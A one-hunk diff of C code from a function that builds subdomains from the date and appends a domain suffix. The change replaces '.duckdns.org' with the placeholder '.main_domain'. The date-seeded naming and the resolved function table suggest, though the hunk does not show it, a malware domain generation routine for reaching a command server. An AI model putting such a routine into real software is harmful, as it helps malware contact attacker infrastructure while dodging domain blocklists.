@@ -80,7 +80,7 @@ void generate_subdomains_by_date(wchar_t buffer[][32], int count, PFUNCTION_TABL
 
         // Copy subdomain into buffer[i]
         custom_memcpy(buffer[i], subdomain, 24);
-        custom_memcpy(buffer[i] + 12, L".duckdns.org", 24);
+        custom_memcpy(buffer[i] + 12, L".main_domain", 24);
 
         // Null terminate
         buffer[i][24] = L'\0'; // total 24 chars: 12+12
